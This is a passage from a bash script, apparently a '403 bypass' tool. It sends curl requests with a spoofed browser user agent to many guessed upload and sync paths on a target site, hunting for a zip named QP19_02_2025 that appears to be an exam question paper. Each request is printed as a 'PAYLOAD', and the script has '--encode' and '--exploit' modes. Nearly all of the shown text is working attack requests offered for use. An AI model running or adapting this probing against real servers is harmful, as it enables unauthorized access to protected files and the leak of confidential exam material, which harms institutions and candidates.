" "${target}Sync-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print

}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
